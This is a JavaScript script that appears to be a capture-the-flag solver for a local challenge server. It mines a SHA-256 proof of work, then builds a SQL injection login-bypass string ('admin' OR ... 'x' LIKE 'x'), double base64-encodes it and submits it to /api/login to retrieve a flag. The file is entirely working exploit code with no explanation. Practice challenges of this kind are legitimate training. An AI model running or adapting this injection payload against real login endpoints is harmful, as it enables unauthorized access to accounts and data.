import { createHash } from "node:crypto";

const baseUrl = process.env.BASE_URL ?? "http://localhost:3000";
const maxIterations = Number(process.env.MAX_ITERATIONS ?? "80000000");

function sha256Hex(value) {
  return createHash("sha256").update(value).digest("hex");
}

function b64(value) {
  return Buffer.from(value, "utf8").toString("base64");
}

async function getJson(url, init) {
  const response = await fetch(url, init);
  const raw = await response.text();
  let parsed;

  try {
    parsed = JSON.parse(raw);
  } catch {
    throw new Error(`Non-JSON response from ${url}: ${raw.slice(0, 300)}`);
  }

  if (!response.ok) {
    throw new Error(`HTTP ${response.status} from ${url}: ${JSON.stringify(parsed)}`);
  }

  return parsed;
}

function findProof(seed, difficulty) {
  const target = "0".repeat(difficulty);

  for (let i = 0; i < maxIterations; i += 1) {
    const candidate = i.toString(16);
    if (sha256Hex(`${seed}:${candidate}`).startsWith(target)) {
      return candidate;
    }
  }

  throw new Error(
    `Proof not found in ${maxIterations} iterations. Increase MAX_ITERATIONS or lower POW_DIFFICULTY.`
  );
}

async function main() {
  console.log(`[+] Target: ${baseUrl}`);

  const challenge = await getJson(`${baseUrl}/api/challenge`, {
    method: "GET",
    headers: { "Cache-Control": "no-store" },
  });

  const { challengeId, seed, difficulty, expiresInMs } = challenge;

  if (!challengeId || !seed || typeof difficulty !== "number") {
    throw new Error(`Unexpected challenge format: ${JSON.stringify(challenge)}`);
  }

  console.log(`[+] challengeId: ${String(challengeId).slice(0, 20)}...`);
  console.log(`[+] seed: ${seed}`);
  console.log(`[+] difficulty: ${difficulty}`);
  console.log(`[+] ttl(ms): ${expiresInMs}`);
  console.log("[+] Mining proof...");

  const proof = findProof(seed, difficulty);
  console.log(`[+] proof: ${proof}`);

  const template = `admin' OR JSON_UNQUOTE(JSON_EXTRACT('{\\"k\\":\\"${seed}:${proof}\\"}','$.k'))='${seed}:${proof}' AND ST_Distance_Sphere(POINT(0,0),POINT(0,0))=0 AND 'x' LIKE 'x`;
  const payload = b64(b64(template));

  console.log("[+] Submitting payload...");
  const login = await getJson(`${baseUrl}/api/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ challengeId, proof, payload }),
  });

  console.log("[+] Server response:");
  console.log(JSON.stringify(login, null, 2));

  if (login.ok && login.flag) {
    console.log(`[+] FLAG: ${login.flag}`);
  }
}

main().catch((error) => {
  console.error("[x] Solver failed:", error.message);
  process.exit(1);
});
